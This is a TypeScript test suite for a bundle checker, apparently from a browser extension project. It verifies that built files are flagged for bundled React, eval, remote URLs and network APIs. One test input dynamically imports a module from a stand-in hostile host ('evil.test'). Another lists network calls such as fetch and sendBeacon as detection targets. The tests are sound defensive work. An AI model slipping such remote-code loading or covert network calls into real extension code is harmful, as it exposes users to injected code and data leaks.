import assert from "node:assert/strict"
import { spawnSync } from "node:child_process"
import { mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import path from "node:path"
import { before, describe, test } from "node:test"
import { checkBundle, MAX_HOOK_BYTES } from "./bundles.ts"

const repo = path.resolve(import.meta.dirname, "../..")

function bundle(files: Record<string, string>) {
  const dir = mkdtempSync(path.join(tmpdir(), "reactdx-check-"))
  for (const [name, content] of Object.entries(files)) {
    mkdirSync(path.dirname(path.join(dir, name)), { recursive: true })
    writeFileSync(path.join(dir, name), content)
  }
  return dir
}

test("a clean bundle passes", () => {
  assert.deepEqual(checkBundle(bundle({ "a.js": "console.log(1)" })), [])
})

for (const file of [
  "test-env/react-18/node_modules/react/cjs/react.production.min.js",
  "test-env/react-18/node_modules/react-dom/cjs/react-dom.production.min.js",
  "test-env/react-19/node_modules/react/cjs/react.production.js",
  "test-env/react-19/node_modules/react-dom/cjs/react-dom-client.production.js",
]) {
  test(`flags React: ${file}`, () => {
    const violations = checkBundle(
      bundle({ "chunks/x.js": readFileSync(path.join(repo, file), "utf8") }),
    )
    assert.ok(
      violations.some((v) => v.startsWith("chunks/x.js: React (")),
      String(violations),
    )
  })
}

test("flags eval and the Function constructor", () => {
  assert.deepEqual(checkBundle(bundle({ "a.js": 'eval("1")' })), [
    "a.js: dynamic code (eval)",
  ])
  assert.deepEqual(
    checkBundle(bundle({ "a.js": 'new Function("return 1")' })),
    ["a.js: dynamic code (Function)"],
  )
  assert.deepEqual(
    checkBundle(bundle({ "a.js": "page.evaluate(f); x.medieval(1)" })),
    [],
  )
})

test("flags remote URLs in scripts, pages, the manifest and CSS", () => {
  assert.deepEqual(
    checkBundle(
      bundle({
        "panel.html": '<script src="https://cdn.example.com/x.js"></script>',
      }),
    ),
    ["panel.html: remote URL (https://cdn.example.com/x.js)"],
  )
  assert.deepEqual(
    checkBundle(
      bundle({
        "manifest.json": `{"content_security_policy":{"extension_pages":"script-src 'self' https://cdn.example.com"}}`,
      }),
    ),
    ["manifest.json: remote URL (https://cdn.example.com)"],
  )
  assert.deepEqual(
    checkBundle(bundle({ "a.js": 'import("http://evil.test/m.js")' })),
    ["a.js: remote URL (http://evil.test/m.js)"],
  )
  assert.deepEqual(
    checkBundle(bundle({ "a.css": "a{background:url(https://x.test/i.png)}" })),
    ["a.css: remote URL (https://x.test/i.png)"],
  )
  assert.deepEqual(
    checkBundle(
      bundle({
        "a.js": 'createElementNS("http://www.w3.org/1998/Math/MathML","math")',
      }),
    ),
    [],
  )
})

test("ignores URLs in CSS comments, which never load", () => {
  const banner =
    "/*! tailwindcss v4.3.5 | MIT License | https://tailwindcss.com */"
  assert.deepEqual(
    checkBundle(bundle({ "a.css": `${banner}\n.x{color:red}` })),
    [],
  )
  assert.deepEqual(
    checkBundle(
      bundle({
        "a.css": `${banner}\n.x{background:url(https://example.com/a.png)}`,
      }),
    ),
    ["a.css: remote URL (https://example.com/a.png)"],
  )
  assert.deepEqual(
    checkBundle(bundle({ "a.js": "/* https://example.com/x */ f()" })),
    ["a.js: remote URL (https://example.com/x)"],
  )
})

test("flags network APIs", () => {
  for (const [code, name] of [
    ["fetch(u)", "fetch"],
    ["importScripts(u)", "importScripts"],
    ["new XMLHttpRequest()", "XMLHttpRequest"],
    ["new WebSocket(u)", "WebSocket"],
    ["new EventSource(u)", "EventSource"],
    ["navigator.sendBeacon(u)", "sendBeacon"],
  ]) {
    assert.deepEqual(checkBundle(bundle({ "a.js": code })), [
      `a.js: network API (${name})`,
    ])
  }
  assert.deepEqual(
    checkBundle(bundle({ "a.js": "prefetchAll(); const fetched = 1" })),
    [],
  )
})

test("flags a hook script over the budget", () => {
  assert.deepEqual(
    checkBundle(
      bundle({ "content-scripts/hook.js": "x".repeat(MAX_HOOK_BYTES + 1) }),
    ),
    [
      `content-scripts/hook.js: hook.js is ${MAX_HOOK_BYTES + 1} bytes, over ${MAX_HOOK_BYTES}`,
    ],
  )
  assert.deepEqual(
    checkBundle(
      bundle({ "content-scripts/hook.js": "x".repeat(MAX_HOOK_BYTES) }),
    ),
    [],
  )
})

describe("the shipped build", () => {
  before(() =>
    assert.equal(spawnSync("pnpm", ["build"], { cwd: repo }).status, 0),
  )

  test("passes the bundle check", () => {
    const run = spawnSync("node", ["scripts/check/run.ts"], {
      cwd: repo,
      encoding: "utf8",
    })
    assert.equal(run.stdout, "")
    assert.equal(run.status, 0)
  })
})
